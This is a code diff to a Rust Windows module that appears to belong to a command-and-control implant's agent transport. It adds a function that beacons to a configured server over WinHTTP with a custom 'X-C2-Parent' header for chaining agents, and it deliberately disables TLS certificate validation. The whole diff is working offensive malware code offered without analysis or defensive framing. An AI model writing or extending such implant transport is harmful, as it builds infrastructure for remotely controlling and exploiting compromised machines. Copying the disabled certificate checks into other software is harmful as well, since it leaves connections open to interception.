@@ -13,10 +13,10 @@ use std::io::{Read, Write};
 use base64::{engine::general_purpose::STANDARD, Engine as _};
 use serde_json::Value;
 use windows_sys::Win32::Networking::WinHttp::{
-    WinHttpCloseHandle, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest, WinHttpQueryHeaders,
-    WinHttpReadData, WinHttpReceiveResponse, WinHttpSendRequest, WinHttpSetOption,
-    WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_FLAG_SECURE, WINHTTP_OPTION_SECURITY_FLAGS,
-    WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_QUERY_STATUS_CODE,
+    WinHttpAddRequestHeaders, WinHttpCloseHandle, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest,
+    WinHttpQueryHeaders, WinHttpReadData, WinHttpReceiveResponse, WinHttpSendRequest, WinHttpSetOption,
+    WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_ADDREQ_FLAG_ADD, WINHTTP_FLAG_SECURE,
+    WINHTTP_OPTION_SECURITY_FLAGS, WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_QUERY_STATUS_CODE,
 };
 
 use crate::{config, crypto};
@@ -285,6 +285,44 @@ fn http_do_inner(method: &str, path: &str, body: &[u8], cert_ctx: *mut c_void) -
 /// Public HTTP helper (no client certificate).  Used for plain http/https transport.
 pub fn http_do(method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
     http_do_inner(method, path, body, ptr::null_mut())
+}
+
+/// Like http_do but injects an extra request header (e.g., "X-C2-Parent: <id>\r\n").
+pub fn http_do_with_header(method: &str, path: &str, body: &[u8], extra_header: &str) -> Option<(u32, Vec<u8>)> {
+    if extra_header.is_empty() { return http_do(method, path, body); }
+    let p = parse_url(config::SERVER_URL);
+    let full_path = format!("{}{}", p.base, path);
+    let ua_w   = wstr(config::USER_AGENT);
+    let host_w = wstr(&p.host);
+    let meth_w = wstr(method);
+    let path_w = wstr(&full_path);
+    let secure = if p.is_https { WINHTTP_FLAG_SECURE } else { 0 };
+    unsafe {
+        let h_sess = WHandle(WinHttpOpen(ua_w.as_ptr(), WINHTTP_ACCESS_TYPE_NO_PROXY, ptr::null(), ptr::null(), 0));
+        if h_sess.is_null() { return None; }
+        let h_conn = WHandle(WinHttpConnect(h_sess.raw(), host_w.as_ptr(), p.port, 0));
+        if h_conn.is_null() { return None; }
+        let h_req = WHandle(WinHttpOpenRequest(h_conn.raw(), meth_w.as_ptr(), path_w.as_ptr(), ptr::null(), ptr::null(), ptr::null(), secure));
+        if h_req.is_null() { return None; }
+        if p.is_https {
+            let flags: u32 = SEC_IGNORE_UNKNOWN_CA | SEC_IGNORE_CERT_WRONG_USAGE | SEC_IGNORE_CERT_CN_INVALID | SEC_IGNORE_CERT_DATE_INVALID;
+            WinHttpSetOption(h_req.raw(), WINHTTP_OPTION_SECURITY_FLAGS, &flags as *const u32 as *const c_void, core::mem::size_of::<u32>() as u32);
+        }
+        let hdr_w = wstr(extra_header);
+        WinHttpAddRequestHeaders(h_req.raw(), hdr_w.as_ptr(), extra_header.len() as u32, WINHTTP_ADDREQ_FLAG_ADD);
+        let body_ptr: *const c_void = if body.is_empty() { ptr::null() } else { body.as_ptr() as *const c_void };
+        if WinHttpSendRequest(h_req.raw(), ptr::null(), 0, body_ptr, body.len() as u32, body.len() as u32, 0) == 0 { return None; }
+        if WinHttpReceiveResponse(h_req.raw(), ptr::null_mut()) == 0 { return None; }
+        let mut status: u32 = 0; let mut sz: u32 = 4;
+        WinHttpQueryHeaders(h_req.raw(), WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, ptr::null(), &mut status as *mut u32 as *mut c_void, &mut sz, ptr::null_mut());
+        let mut data = Vec::new();
+        let mut buf = [0u8; 8192]; let mut got: u32 = 0;
+        loop {
+            if WinHttpReadData(h_req.raw(), buf.as_mut_ptr() as *mut c_void, buf.len() as u32, &mut got) == 0 || got == 0 { break; }
+            data.extend_from_slice(&buf[..got as usize]);
+        }
+        Some((status, data))
+    }
 }
 
 // ── Agent transport ───────────────────────────────────────────────────────────
